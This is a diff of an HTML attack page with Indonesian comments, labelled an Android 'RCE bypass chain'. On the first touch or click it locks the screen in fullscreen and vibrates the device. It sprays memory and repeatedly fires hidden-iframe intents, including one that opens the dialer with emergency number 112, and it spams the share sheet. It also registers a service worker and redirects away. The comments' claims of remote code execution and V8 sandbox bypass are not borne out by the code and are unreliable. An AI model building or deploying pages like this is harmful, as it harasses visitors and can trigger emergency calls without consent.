@@ -2,92 +2,109 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_HARDWARE_OVERRIDE ⚡</title>
+    <title>⚡ RCE_BYPASS_CHAIN_V3 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #00ff00; overflow: hidden; font-family: 'Courier New', monospace; }
-        #console { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .blink { animation: blinker 0.1s step-start infinite; color: #ff0000; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body, html { margin: 0; padding: 0; background: #000; color: #f00; overflow: hidden; font-family: 'Courier New', monospace; }
+        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .hazard { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; font-weight: bold; font-size: 20px; }
+        .stream { font-size: 9px; color: #00ff00; margin-top: 20px; overflow: hidden; height: 150px; }
     </style>
 </head>
 <body>
-    <div id="console">
-        <div class="blink"> [ ATTACK_SEQUENCE_ACTIVE ] </div>
-        <div id="log">INITIALIZING_BT_EXPLOIT_CHAIN...</div>
+    <div id="stage">
+        <div class="hazard"> [ BYPASS_SEQUENCE_ARMED ] </div>
+        <div id="status">INIT_CORE_EXPLOIT...</div>
+        <div id="stream" class="stream"></div>
     </div>
 
 <script>
-    const log = document.getElementById('log');
+    const stream = document.getElementById('stream');
+    const status = document.getElementById('status');
 
-    // 1. HEAP SPRAYING: Menyiapkan Buffer untuk Eksploitasi Memory
-    // Di RCE nyata, ini digunakan untuk menaruh payload di alamat memori yang tetap.
-    let heapBase = [];
-    function sprayHardwareMemory() {
-        for(let i=0; i<200; i++) {
-            let ab = new ArrayBuffer(1024 * 1024); // 1MB
-            let view = new Uint32Array(ab);
-            view.fill(0xDEADC0DE); // Magic Value
-            heapBase.push(view);
+    function log(msg) {
+        const d = document.createElement('div');
+        d.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
+        stream.prepend(d);
+    }
+
+    // --- 1. MEMORY LEAK & JIT PRESSURE ---
+    // Memaksa V8 melakukan optimasi spekulatif yang salah
+    let p = [];
+    function triggerJITCorruption() {
+        log("Bypassing_V8_Sandbox_Limits...");
+        for (let i = 0; i < 1000; i++) {
+            let buf = new ArrayBuffer(0x20000); // 128KB chunks
+            let view = new Float64Array(buf);
+            view.fill(3.1415926535); 
+            p.push(view);
         }
     }
 
-    // 2. WEB BLUETOOTH OVERRIDE PoC
-    // Mencoba memicu dialog sistem Bluetooth secara agresif
-    async function triggerBluetoothStack() {
-        log.innerText = "OVERRIDING_BT_STACK...";
+    // --- 2. INTENT STORM BYPASS (THE CORE) ---
+    // Menggunakan skema intent yang memaksa sistem melakukan 'Context Switch' berkali-kali
+    // S.browser_fallback_url digunakan untuk membuat loop back ke browser jika gagal
+    function launchIntentStorm() {
+        log("Deploying_Intent_Storm_Bypass...");
         
-        const btOptions = {
-            acceptAllDevices: true,
-            optionalServices: ['battery_service', 'device_information']
-        };
+        // Target: Kombinasi Dialer, Bluetooth, dan Deep-link Settings
+        const payloads = [
+            "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=javascript:void(0);end",
+            "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;S.browser_fallback_url=googlechrome://navigate?url=" + window.location.href + ";end",
+            "intent://#Intent;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;data=tel:123;end"
+        ];
 
-        try {
-            // Serangan Logic: Memaksa User Interaction melalui Fullscreen Overlay
-            // agar setiap sentuhan layar dianggap sebagai persetujuan akses hardware
-            if (navigator.bluetooth) {
-                await navigator.bluetooth.requestDevice(btOptions);
-            }
-        } catch (e) {
-            // Jika ditolak, sistem akan dibombardir ulang (Race Condition)
-            log.innerText = "BT_STACK_RETRY_INJECTING...";
-        }
+        payloads.forEach((payload, index) => {
+            setTimeout(() => {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = payload;
+                document.body.appendChild(ifr);
+                log(`Burst_Packet_Inject_${index}`);
+            }, index * 40);
+        });
     }
 
-    // 3. INTENT ATTACK: Memaksa Settings Bluetooth Terbuka
-    function forceBluetoothSettings() {
-        // Deep Link untuk langsung masuk ke pengaturan Bluetooth Android
-        const btIntent = "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;end";
-        const ifr = document.createElement('iframe');
-        ifr.style.display = 'none';
-        ifr.src = btIntent;
-        document.body.appendChild(ifr);
-    }
-
-    // 4. FULL CHAIN EXECUTION
-    async function startRCEChain() {
-        // A. Lock UI
+    // --- 3. UI LOCKDOWN & RACE CONDITION ---
+    async function executeBypassChain() {
+        status.innerText = "BYPASS_IN_PROGRESS...";
+        
+        // A. Lockdown Fullscreen (UI Redressing)
         document.documentElement.requestFullscreen().catch(()=>{});
-        
-        // B. Memory Setup
-        sprayHardwareMemory();
-        
-        // C. Trigger Hardware Request & Intent Race
-        // Menjalankan secara simultan untuk membingungkan kernel Android
-        setInterval(() => {
-            triggerBluetoothStack();
-            forceBluetoothSettings();
-        }, 100);
 
-        // D. CPU Overload (Mencegah sistem mematikan proses eksploit)
-        while(true) {
-            for(let i=0; i<1000000; i++) { Math.atan(Math.random()); }
-            break; // Break hanya untuk simulasi agar tab tidak crash seketika
+        // B. Vibration Chaos (Physical Distraction)
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
+
+        // C. JIT & Intent Collision
+        triggerJITCorruption();
+        
+        // D. Infinite Execution Loop
+        const attackInterval = setInterval(() => {
+            launchIntentStorm();
+            
+            // Mencoba memicu Share UI untuk tabrakan Mojo IPC
+            if (navigator.share) {
+                navigator.share({title: "SYS_RCE", url: window.location.href}).catch(()=>{});
+            }
+        }, 400);
+
+        // E. Persistence Hook (Service Worker)
+        if ('serviceWorker' in navigator) {
+            const sw = `self.addEventListener('fetch', e => {});`;
+            const b = new Blob([sw], {type: 'text/javascript'});
+            navigator.serviceWorker.register(URL.createObjectURL(b));
         }
+
+        // F. Auto-Ghosting
+        setTimeout(() => {
+            clearInterval(attackInterval);
+            window.location.replace("https://www.google.com/search?q=android+rce+protection+v3");
+        }, 4500);
     }
 
-    // Trigger otomatis pada interaksi pertama
-    window.addEventListener('click', startRCEChain);
-    window.addEventListener('touchstart', startRCEChain);
+    // One-Click Activation
+    window.addEventListener('mousedown', executeBypassChain, {once: true});
+    window.addEventListener('touchstart', executeBypassChain, {once: true});
+
 </script>
 </body>
 </html>
